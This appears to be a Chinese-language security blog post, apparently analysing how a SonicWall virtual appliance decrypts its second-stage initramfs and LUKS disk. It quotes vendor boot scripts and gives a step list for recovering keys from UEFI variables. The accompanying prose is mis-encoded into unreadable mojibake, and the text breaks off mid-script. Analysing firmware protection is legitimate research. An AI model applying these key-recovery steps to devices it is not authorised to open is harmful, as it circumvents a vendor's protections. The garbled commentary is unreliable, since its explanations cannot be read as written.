<p>ä»ä»£ç å¯ä»¥çœ‹åˆ°åº”è¯¥è¿˜å­˜åœ¨ä¸€ä¸ªå«åš â€œsunupâ€ çš„ initramfsï¼Œè¯´æ˜å†…æ ¸åŠ è½½çš„ initramfs ä¸­å¯èƒ½æ²¡æœ‰ç›´æ¥è§£å¯†ç¡¬ç›˜ã€‚</p>
<p>early_setup å‡½æ•°æ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œsetup_stage2 ä¸ºå…³é”®å‡½æ•°ï¼Œå®ƒä¼šè°ƒç”¨ unpack_stage2 å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">unpack_stage2</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$&#123;SPECIAL_BUILD_MESSAGE// /&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;**<span class="variable">$&#123;SPECIAL_BUILD_MESSAGE//?/*&#125;</span>**&quot;</span> &amp;&amp;</span><br><span class="line">         <span class="built_in">echo</span> <span class="string">&quot;* <span class="variable">$SPECIAL_BUILD_MESSAGE</span> *&quot;</span>        &amp;&amp;</span><br><span class="line">         <span class="built_in">echo</span> <span class="string">&quot;**<span class="variable">$&#123;SPECIAL_BUILD_MESSAGE//?/*&#125;</span>**&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    sanity_check</span><br><span class="line"></span><br><span class="line">    <span class="built_in">log</span> <span class="string">&quot;Setting up stage2 initramfs (sunup) ...&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">local</span> use_sunup_key_from=<span class="string">&quot;<span class="variable">$&#123;SUNUP_USE_KEY_FROM&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">local</span> kek</span><br><span class="line">    kek=$(<span class="built_in">mktemp</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;FS&quot;</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_key_in_fs</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">log</span> <span class="string">&quot;Found key in FS...&quot;</span></span><br><span class="line">        <span class="comment"># key=/onetime.key is present in FS</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        halt <span class="string">&quot;Unable to setup stage2 (key not in fs) ...&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;UEFI&quot;</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_kek_in_uefi</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">log</span> <span class="string">&quot;Found key in UEFI ...&quot;</span></span><br><span class="line">        do_get_kek_from_uefi &gt; <span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">        openssl rsautl -verify -<span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;ENC_KEY&#125;</span>&quot;</span> -pubin -inkey <span class="string">&quot;<span class="variable">$kek</span>&quot;</span> -out <span class="variable">$&#123;KEY&#125;</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        halt <span class="string">&quot;BIOS not properly provisioned, please contact technical support&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;SSSS&quot;</span></span><br><span class="line">    <span class="keyword">then</span> <span class="keyword">if</span> get_key_from_ssss &gt; <span class="string">&quot;<span class="variable">$KEY</span>&quot;</span></span><br><span class="line">         <span class="keyword">then</span> <span class="built_in">log</span> <span class="string">&quot;Found key in SSSS ...&quot;</span></span><br><span class="line">         <span class="keyword">else</span> halt <span class="string">&quot;Corrupt/missing secure store, please contact technical support&quot;</span></span><br><span class="line">         <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;OVMF&quot;</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> is_kek_in_ovmf</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">log</span> <span class="string">&quot;Found key in OVMF ...&quot;</span></span><br><span class="line">        do_get_kek_from_ovmf &gt; <span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">        openssl rsautl -verify -decrypt -<span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;ENC_KEY&#125;</span>&quot;</span> -inkey <span class="string">&quot;<span class="variable">$kek</span>&quot;</span> -out <span class="variable">$&#123;KEY&#125;</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        halt <span class="string">&quot;Please use SonicWall supplied UEFI OVMF_CODE. Please contact technical support &quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$use_sunup_key_from</span>&quot;</span> = <span class="string">&quot;ACPI_BGRT_XFRM_UTIL&quot;</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> is_kek_in_acpi_bgrt</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">log</span> <span class="string">&quot;Found key in XFRM ...&quot;</span></span><br><span class="line">          do_get_kek_from_acpi_bgrt &gt; <span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">          openssl enc -a -aes-256-cbc -d -pbkdf2 -<span class="keyword">in</span> <span class="variable">$&#123;ENC_KEY&#125;</span> -salt -out <span class="variable">$&#123;KEY&#125;</span> -pass file:<span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          halt <span class="string">&quot;Please use SonicWall supplied OVMF, please contact technical support&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># decrypt stage2 (sunup)</span></span><br><span class="line">    openssl enc -a -d -aes-256-cbc -pbkdf2 \</span><br><span class="line">      -<span class="keyword">in</span> <span class="variable">$ROOT_IMAGE_ENC</span> -salt \</span><br><span class="line">      -out <span class="variable">$ROOT_IMAGE</span> \</span><br><span class="line">      -pass file:<span class="variable">$&#123;KEY&#125;</span></span><br><span class="line"></span><br><span class="line">    rc=$?</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$rc</span> -ne 0</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      halt <span class="string">&quot;Unable to setup stage2 initramfs (sunup) ...&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">log</span> <span class="string">&quot;Finished setting up stage2 initramfs (sunup) ... &quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°åŒ…å«å‡ ç§ä¸åŒçš„å¯†é’¥åŠ è½½æ–¹æ³•ï¼Œè™šæ‹Ÿæœºç¯å¢ƒä¸­é»˜è®¤ä½¿ç”¨ SSSS æ–¹æ³•ï¼Œå› æ­¤ä»£ç åˆä¼šè°ƒç”¨ get_key_from_ssss å‡½æ•°ã€‚</p>
<p>éƒ¨åˆ†å…³é”®é€»è¾‘åˆ—ä¸¾å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">efi_get_var</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">test</span> -e <span class="string">&quot;/sys/firmware/efi/efivars/<span class="variable">$1</span>&quot;</span>    <span class="comment"># check if file exists</span></span><br><span class="line">    <span class="keyword">then</span> <span class="built_in">dd</span> bs=1 skip=4 2&gt;/dev/null &lt; <span class="string">&quot;/sys/firmware/efi/efivars/<span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_BACKUP_SYS&#125;</span>&quot;</span> <span class="comment"># look on backup</span></span><br><span class="line">    <span class="keyword">then</span> with-mount-sys-partition <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_BACKUP_SYS&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_BACKUP_PARTITION&#125;</span>&quot;</span> tar -xzf <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_BACKUP_FILE&#125;</span>&quot;</span> -O <span class="string">&quot;<span class="variable">$1</span>&quot;</span> | <span class="built_in">dd</span> bs=1 skip=4 2&gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span> &amp;&amp; pipe-result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># non TINY data</span></span><br><span class="line"><span class="function"><span class="title">efi_get_data</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> pass</span><br><span class="line">    <span class="comment"># 2-step to avoid contention on tpm0 device as sonictpm doesn&#x27;t retry</span></span><br><span class="line">    pass=$(efi_get_var <span class="string">&quot;KEY<span class="variable">$&#123;SCX_SECURE_STORE_SEPARATOR&#125;</span><span class="variable">$1</span>-<span class="variable">$&#123;SSSS_UEFI_ID&#125;</span>&quot;</span> | /bin/gunzip | dessss | <span class="built_in">base64</span> &amp;&amp; pipe-result ) &amp;&amp;</span><br><span class="line">    efi_get_var <span class="string">&quot;DATA<span class="variable">$&#123;SCX_SECURE_STORE_SEPARATOR&#125;</span><span class="variable">$1</span>-<span class="variable">$&#123;SSSS_UEFI_ID&#125;</span>&quot;</span> | openssl enc -des-ecb -iter 512 -d -pass file:&lt;( <span class="built_in">base64</span> -d &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$pass</span>&quot;</span> ) &amp;&amp; pipe-result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_kek_from_ssss</span></span>() &#123;</span><br><span class="line">    efi_get_data <span class="string">&quot;<span class="variable">$&#123;SSSS_UEFI_KEY&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_key_from_ssss</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> kek</span><br><span class="line">    kek=$(<span class="built_in">mktemp</span>) &amp;&amp; get_kek_from_ssss &gt; <span class="string">&quot;<span class="variable">$kek</span>&quot;</span> &amp;&amp; openssl rsautl -decrypt -inkey <span class="string">&quot;<span class="variable">$kek</span>&quot;</span> -<span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;ENC_KEY&#125;</span>&quot;</span></span><br><span class="line">    just <span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$kek</span>&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€è¦æ€»ç»“è§£å¯† sunup çš„é€»è¾‘</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ä» /sys/firmware/efi/efivars ç›®å½•ä¸‹è¯»å– KEY:SUNUP å¯†é’¥</span><br><span class="line">2. æ ¹æ® CryptoEnging è®¾ç½®è§£å¯†æ–¹æ³• (é»˜è®¤ä¸º crypto-engine-openssl)</span><br><span class="line">3. è¯»å– LastBootMachineId ä½œä¸ºå¯†ç å¯¹å¯†é’¥è¿›è¡Œè§£å¯†</span><br><span class="line">4. ä½¿ç”¨å¾—åˆ°çš„ KEY å»è§£å¯† DATA:SUNUP æ–‡ä»¶</span><br><span class="line">5. ç”¨å¾—åˆ°çš„ SUNUP RSA ç§é’¥è§£å¯† onetime.key.enc æ–‡ä»¶</span><br><span class="line">6. ç”¨ onetime.key å†å»è§£å¯† sunup.cpio.gz.enc æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>

<p>ä»é€»è¾‘ä¸Šçœ‹ç³»ç»Ÿåº”è¯¥æ˜¯å®ç°äº†ä¸€å¥— SecureBoot æµç¨‹ï¼ŒçŒœæµ‹åœ¨ç¡¬ä»¶è®¾å¤‡ä¸Šå…·æœ‰ TPM ç­‰å®‰å…¨èŠ¯ç‰‡ï¼Œå¯†é’¥ä¿¡æ¯è¢«ä¿å­˜åˆ°èŠ¯ç‰‡ä¸­ã€‚ä½†åœ¨è™šæ‹Ÿæœºç¯å¢ƒä¸‹ä¸å…·å¤‡ TPM æ¡ä»¶ï¼Œæ‰€ä»¥åªèƒ½å°†å¯†é’¥ä¿å­˜åœ¨ BOOT åˆ†åŒºä¸­ã€‚</p>
<p>æŒ‰ç…§ä»¥ä¸Šé€»è¾‘è§£å¯† SUNUPï¼Œå¾—åˆ°ç¬¬äºŒä¸ª initramfsï¼Œåœ¨è¿™ä¸ªé˜¶æ®µä»£ç å°±ä¼šè§£å¯†ç£ç›˜ã€‚è¿˜æ˜¯åˆ†æ &#x2F;init ç¨‹åºï¼Œå®ƒä¼šæ‹‰èµ· &#x2F;init.d ä¸­çš„åˆå§‹åŒ–è„šæœ¬ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå«åš 14-keys çš„è„šæœ¬è´Ÿè´£åˆå§‹åŒ–å¯†é’¥ã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">keys_install_key</span></span>() &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> -p secure-store &amp;&gt;/dev/null <span class="comment">#&amp;&amp; test &quot;$&#123;SECURE_STORE_RSA_SUPPORT:-0&#125;&quot; != &quot;0&quot;</span></span><br><span class="line">  <span class="keyword">then</span> <span class="comment"># info &quot;Importing $2=$1&quot;</span></span><br><span class="line">       <span class="built_in">local</span> <span class="built_in">md5sum</span> current</span><br><span class="line">       <span class="keyword">if</span> ! <span class="built_in">md5sum</span>=$(<span class="built_in">md5sum</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>) || ! <span class="built_in">read</span> -r <span class="built_in">md5sum</span> _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> debug <span class="string">&quot;Can&#x27;t read <span class="variable">$1</span>&quot;</span></span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">       <span class="keyword">elif</span> current=$(secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> get <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span>) &amp;&amp; <span class="built_in">read</span> -r current _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$current</span>&quot;</span> &amp;&amp; <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span> = <span class="string">&quot;<span class="variable">$current</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> debug <span class="string">&quot;Already imported <span class="variable">$2</span>&quot;</span></span><br><span class="line">       <span class="keyword">elif</span> secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> import <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp; secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> put <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> debug <span class="string">&quot;Imported <span class="variable">$2</span>=<span class="variable">$1</span>&quot;</span></span><br><span class="line">       <span class="keyword">else</span> warn <span class="string">&quot;Importing <span class="variable">$2</span>=<span class="variable">$1</span> failed&quot;</span></span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># copy key to extra store without re-importing</span></span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> <span class="keyword">if</span> current=$(secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> get <span class="string">&quot;<span class="variable">$2</span>&quot;</span>) &amp;&amp; <span class="built_in">read</span> -r current _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$current</span>&quot;</span> &amp;&amp;</span><br><span class="line">               <span class="built_in">md5sum</span>=$(secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> get <span class="string">&quot;<span class="variable">$2</span>&quot;</span>) &amp;&amp; <span class="built_in">read</span> -r <span class="built_in">md5sum</span> _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span> &amp;&amp;</span><br><span class="line">               <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span> = <span class="string">&quot;<span class="variable">$current</span>&quot;</span></span><br><span class="line">            <span class="keyword">then</span> debug <span class="string">&quot;Already imported extra <span class="variable">$2</span>&quot;</span></span><br><span class="line">            <span class="keyword">else</span> <span class="comment"># get key imported somehow</span></span><br><span class="line">                 <span class="keyword">if</span> secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_DEFAULT&#125;</span>&quot;</span> get <span class="string">&quot;<span class="variable">$2</span>&quot;</span> | secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> put <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp;</span><br><span class="line">                    secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> put <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">                 <span class="keyword">then</span> debug <span class="string">&quot;Imported extra <span class="variable">$2</span>=<span class="variable">$1</span>&quot;</span></span><br><span class="line">                 <span class="keyword">else</span> <span class="comment"># Can&#x27;t import from SECURE_STORE_DEFAULT as it doesn&#x27;t work</span></span><br><span class="line">                      warn <span class="string">&quot;Importing extra <span class="variable">$2</span>=<span class="variable">$1</span> difficult&quot;</span></span><br><span class="line">                      <span class="keyword">if</span> ! <span class="built_in">md5sum</span>=$(<span class="built_in">md5sum</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>) || ! <span class="built_in">read</span> -r <span class="built_in">md5sum</span> _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">                      <span class="keyword">then</span> debug <span class="string">&quot;Can&#x27;t read <span class="variable">$1</span>&quot;</span></span><br><span class="line">                           <span class="built_in">return</span> 1</span><br><span class="line">                      <span class="keyword">elif</span> current=$(secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> get <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span>) &amp;&amp; <span class="built_in">read</span> -r current _ &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$current</span>&quot;</span> &amp;&amp; <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span> = <span class="string">&quot;<span class="variable">$current</span>&quot;</span></span><br><span class="line">                      <span class="keyword">then</span> debug <span class="string">&quot;Already imported extra <span class="variable">$2</span>&quot;</span></span><br><span class="line">                      <span class="keyword">elif</span> secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> import <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp; secure-store <span class="string">&quot;<span class="variable">$&#123;SECURE_STORE_EXTRA&#125;</span>&quot;</span> put <span class="string">&quot;md5sum:<span class="variable">$2</span>&quot;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$md5sum</span>&quot;</span></span><br><span class="line">                      <span class="keyword">then</span> debug <span class="string">&quot;Imported extra <span class="variable">$2</span>=<span class="variable">$1</span>&quot;</span></span><br><span class="line">                      <span class="keyword">else</span> info <span class="string">&quot;Importing extra <span class="variable">$2</span>=<span class="variable">$1</span> failed&quot;</span></span><br><span class="line">                           <span class="built_in">return</span> 1</span><br><span class="line">                      <span class="keyword">fi</span></span><br><span class="line">                 <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">keys_init_platform_keys</span></span>() &#123;</span><br><span class="line">    <span class="comment"># import install keys into keyring</span></span><br><span class="line">    <span class="built_in">local</span> name</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="variable">$INSTALLER_DECRYPT_KEY</span> <span class="variable">$FW_DECRYPT_KEY</span> <span class="variable">$SUNUP_DECRYPT_KEY</span></span><br><span class="line">    <span class="keyword">do</span> keys_install_key <span class="string">&quot;<span class="variable">$&#123;SCX_KEY_PATH&#125;</span>$name<span class="variable">$&#123;SCX_KEY_SUFFIX&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="variable">$SSDH_VERIFY_PUB</span> <span class="variable">$INSTALLER_VERIFY_PUB</span></span><br><span class="line">    <span class="keyword">do</span> keys_install_pub <span class="string">&quot;<span class="variable">$&#123;SCX_KEY_PATH&#125;</span>$name<span class="variable">$&#123;SCX_KEY_SUFFIX&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªè„šæœ¬ç¨‹åºä¼šå°† SYSTEM.LIC ä¸­çš„å¯†é’¥æŒ‰ç…§ç›¸åŒçš„è§£å¯†é€»è¾‘è§£å¯†ï¼Œç„¶ååŠ è½½åˆ°å†…æ ¸å¯†é’¥é“¾ä¸­ï¼Œä¾›åé¢çš„ç¨‹åºä½¿ç”¨ã€‚</p>
<p>æœ€ååœ¨ opt&#x2F;sonicwall&#x2F;soniccore&#x2F;scripts&#x2F;disks è„šæœ¬ä¸­ï¼Œä¼šæ‰§è¡ŒçœŸæ­£çš„è§£å¯†ç£ç›˜æ“ä½œã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/cryptic_foobar</span></span><br><span class="line"><span class="comment"># shellcheck shell=bash</span></span><br><span class="line"><span class="comment"># shellcheck disable=SC1091</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2019 SonicWALL Corporation.</span></span><br><span class="line"><span class="comment"># All rights reserved</span></span><br><span class="line"><span class="comment"># Initial Author: sliddicott@sonicwall.com</span></span><br><span class="line"></span><br><span class="line">PLATFORM_CONFIG_DIR=/usr/lib/config/platform</span><br><span class="line">. <span class="variable">$PLATFORM_CONFIG_DIR</span>/system.sh</span><br><span class="line">. <span class="variable">$PLATFORM_CONFIG_DIR</span>/image.sh</span><br><span class="line"></span><br><span class="line">. sissy <span class="string">&quot;disks&quot;</span> || <span class="built_in">return</span> 0</span><br><span class="line">sissy_load <span class="string">&quot;sunup&quot;</span> || sissy_fail <span class="string">&quot;Could not load required module sunup.&quot;</span> || sissy_calledAsScript || <span class="built_in">return</span> $?</span><br><span class="line"></span><br><span class="line">: <span class="string">&quot;<span class="variable">$&#123;LUKS:=luks&#125;</span>&quot;</span></span><br><span class="line">: <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME:=SYSTEM&#125;</span>&quot;</span></span><br><span class="line">: <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER:=<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>.SYS&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">decrypt_luks_header</span></span>() &#123;</span><br><span class="line">  <span class="comment"># Separate the declaration from the initialization else &#x27;local&#x27; eats the exit code (https://stackoverflow.com/a/4421282/14627257)</span></span><br><span class="line">  <span class="built_in">local</span> r1</span><br><span class="line">  <span class="built_in">local</span> r2</span><br><span class="line">  <span class="comment"># this looks like hell because it runs under busybox sh as well, so no &lt;( ... )</span></span><br><span class="line">  <span class="built_in">exec</span> 3&lt;&amp;0</span><br><span class="line">  &#123; <span class="built_in">printf</span> <span class="string">&quot;Salted__&quot;</span> ; <span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ; &#125; | openssl enc -d -pbkdf2 -aes-256-cbc <span class="variable">$&#123;3&#125;</span> -pass fd:3 -out <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">  <span class="comment"># Ensure printf and openssl return 0</span></span><br><span class="line">  <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$&#123;PIPESTATUS[*]&#125;</span>&quot;</span> = <span class="string">&quot;0 0&quot;</span></span><br><span class="line">  r1=$?</span><br><span class="line">  <span class="comment"># Test the resulting file</span></span><br><span class="line">  cryptsetup luksDump <span class="variable">$2</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">  r2=$?</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Implicitly exit with 0 if both tests pass</span></span><br><span class="line">  <span class="built_in">test</span> <span class="variable">$r1</span> -eq 0 &amp;&amp; <span class="built_in">test</span> <span class="variable">$r2</span> -eq 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">recover_luks_header</span></span>() &#123;</span><br><span class="line">  <span class="built_in">test</span> -z <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYNAME</span>&quot;</span> &amp;&amp; LUKS_HEADER_KEYID=$(keyctl search <span class="string">&quot;<span class="variable">$&#123;LUKS_KEYRING&#125;</span>&quot;</span> user <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYNAME</span>&quot;</span>)</span><br><span class="line">  <span class="comment">#shellcheck disable=SC2015</span></span><br><span class="line">  <span class="comment"># Try password &quot;as is&quot; with -nopad, then try &quot;as is&quot; without nopad.</span></span><br><span class="line">  <span class="comment"># Then try removing newlines with -nopad, lastly try removing newlines and nopad.</span></span><br><span class="line">  <span class="comment"># Using braces to allow || to work as intended - otherwise it is associated with the test-command exit code rather than the decrypt_luks_header exit code.</span></span><br><span class="line">  <span class="comment"># Our pattern is &quot;echo 0 &amp;&amp; echo 1 || echo 2 &amp;&amp; echo 3&quot; where we only want to see &quot;0 1&quot; or &quot;0 1 2 3&quot;.</span></span><br><span class="line">  <span class="comment"># Without braces we&#x27;ll ALWAYS see &quot;0 1 3&quot;...</span></span><br><span class="line">  &#123; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> |              decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;-nopad&quot;</span>; &#125; ||</span><br><span class="line">  &#123; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> |              decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>;          &#125; ||</span><br><span class="line">  &#123; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;-nopad&quot;</span>; &#125; ||</span><br><span class="line">  &#123; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; keyctl pipe <span class="string">&quot;<span 